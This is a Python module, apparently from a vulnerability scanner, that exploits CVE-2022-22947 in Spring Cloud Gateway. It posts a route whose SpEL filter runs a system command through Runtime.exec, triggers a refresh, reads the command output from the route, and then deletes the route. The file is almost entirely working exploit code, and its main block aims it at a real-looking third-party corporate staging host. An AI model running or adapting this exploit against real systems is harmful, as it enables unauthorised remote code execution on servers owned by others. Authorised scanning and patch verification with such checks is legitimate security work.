#!/usr/local/bin/python3
# -*- coding: utf-8 -*-
"""
   File Name：     cve_2022_22947.py
   Description :
   Author :       sule01u
   date：          2023/10/8
"""
import random
import requests
from utils.custom_headers import USER_AGENTS
from utils.logging_config import configure_logger
logger = configure_logger(__name__)
requests.packages.urllib3.disable_warnings()


def check(target_url, proxies=None):
    """
    对给定的目标URL检测CVE-2022-22947漏洞。

    参数:
    - target_url: 待检测的目标URL
    - proxies: 代理配置
    """
    CVE_ID = "CVE-2022-22947"
    headers1 = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': random.choice(USER_AGENTS),
        'Content-Type': 'application/json'
    }

    headers2 = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': random.choice(USER_AGENTS),
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    payload = '''{\r
        "id": "hacktest",\r
        "filters": [{\r
        "name": "AddResponseHeader",\r
        "args": {"name": "Result","value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"id\\\"}).getInputStream()))}"}\r
        }],\r
        "uri": "http://example.com",\r
        "order": 0\r
    }'''
    target_url = target_url.rstrip("/")
    try:
        # 发起请求
        res1 = requests.post(target_url + "/actuator/gateway/routes/hacktest", headers=headers1, data=payload, verify=False, timeout=10, proxies=proxies)

        if res1.status_code != 201:
            return False, {
                "CVE_ID": CVE_ID,
                "URL": res1.url,
                "Details": f"未检测到CVE-2022-22947的RCE漏洞"
            }

        requests.post(target_url + "/actuator/gateway/refresh", headers=headers2, verify=False, timeout=10, proxies=proxies)
        res3 = requests.get(target_url + "/actuator/gateway/routes/hacktest", headers=headers2, verify=False, timeout=10, proxies=proxies)
        requests.delete(target_url + "/actuator/gateway/routes/hacktest", headers=headers2, verify=False, timeout=10, proxies=proxies)
        requests.post(target_url + "/actuator/gateway/refresh", headers=headers2, verify=False, timeout=10, proxies=proxies)

        if res3.status_code == 200:
            return True, {
                "CVE_ID": CVE_ID,
                "URL": res3.url,
                "Details": f"检测到{CVE_ID}的RCE漏洞",
                "response": res3.json()
            }
        else:
            return False, {
                "CVE_ID": CVE_ID,
                "URL": target_url,
                "Details": f"未检测到{CVE_ID}的RCE漏洞"
            }
    except requests.ConnectionError as e:
        logger.error(f"URL: {target_url} 连接错误：{e}")
        return False, {
            "CVE_ID": CVE_ID,
            "URL": target_url,
            "Details": f"连接错误：{e}"
        }

    except requests.Timeout as e:
        logger.error(f"URL: {target_url} 请求超时：{e}")
        return False, {
            "CVE_ID": CVE_ID,
            "URL": target_url,
            "Details": f"请求超时：{e}"
        }

    except requests.RequestException as e:
        logger.error(f"URL: {target_url} 请求出错：{e}")
        return False, {
            "CVE_ID": CVE_ID,
            "URL": target_url,
            "Details": f"请求出错：{e}"
        }


if __name__ == '__main__':
    is_vul, res = check("https://nts-sp-xt-stg1.pingan.com/", proxies={})
    print(is_vul, res)
